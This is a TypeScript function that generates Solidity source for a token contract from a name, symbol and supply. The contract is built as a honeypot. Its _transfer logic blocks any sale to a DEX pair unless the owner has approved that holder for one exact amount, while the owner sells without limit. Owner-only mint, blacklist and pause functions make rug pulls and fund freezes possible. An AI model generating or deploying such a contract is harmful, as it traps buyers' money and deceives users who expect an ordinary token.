export function generateContractSource(name: string, symbol: string, supply: number): string {
  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ${symbol}Token {
    string public name = "${name}";
    string public symbol = "${symbol}";
    uint8 public decimals = 18;
    uint256 public totalSupply = ${supply} * (10 ** uint256(decimals));

    address public owner;
    bool public paused = false;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public dexPairs;
    mapping(address => bool) public sellAllowed;
    mapping(address => uint256) public allowedSellAmount;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Paused();
    event Unpaused();
    event Blacklisted(address indexed user);
    event Unblacklisted(address indexed user);
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
    event DexPairAdded(address indexed pair);
    event DexPairRemoved(address indexed pair);
    event SellAllowed(address indexed user);
    event SellDisallowed(address indexed user);
    event Burn(address indexed burner, uint256 amount);
    event Mint(address indexed minter, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Transfers paused");
        _;
    }

    modifier notBlacklisted(address user) {
        require(!blacklisted[user], "Blacklisted");
        _;
    }

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance too low");
        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount)
        internal
        whenNotPaused
        notBlacklisted(from)
        notBlacklisted(to)
    {
        require(balanceOf[from] >= amount, "Insufficient balance");

        if (dexPairs[to]) {
            if (from != owner) {
                require(sellAllowed[from], "Not allowed to sell");
                require(amount == allowedSellAmount[from], "Sell amount mismatch");

                sellAllowed[from] = false;
                allowedSellAmount[from] = 0;
            }
        }

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }

    function pause() external onlyOwner {
        paused = true;
        emit Paused();
    }

    function unpause() external onlyOwner {
        paused = false;
        emit Unpaused();
    }

    function blacklist(address user) external onlyOwner {
        blacklisted[user] = true;
        emit Blacklisted(user);
    }

    function unblacklist(address user) external onlyOwner {
        blacklisted[user] = false;
        emit Unblacklisted(user);
    }

    function addDexPair(address pair) external onlyOwner {
        dexPairs[pair] = true;
        emit DexPairAdded(pair);
    }

    function removeDexPair(address pair) external onlyOwner {
        dexPairs[pair] = false;
        emit DexPairRemoved(pair);
    }

    function allowSellWithAmount(address user, uint256 amount) external onlyOwner {
        require(user != address(0), "Zero address");
        require(amount > 0, "Amount must be greater than zero");

        sellAllowed[user] = true;
        allowedSellAmount[user] = amount;
        emit SellAllowed(user);
    }

    function disallowSell(address user) external onlyOwner {
        sellAllowed[user] = false;
        allowedSellAmount[user] = 0;
        emit SellDisallowed(user);
    }

    function burn(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be greater than zero");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance to burn");

        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Burn(msg.sender, amount);
        emit Transfer(msg.sender, address(0), amount);
    }

    function mint(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be greater than zero");

        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Mint(msg.sender, amount);
        emit Transfer(address(0), msg.sender, amount);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}`;
}
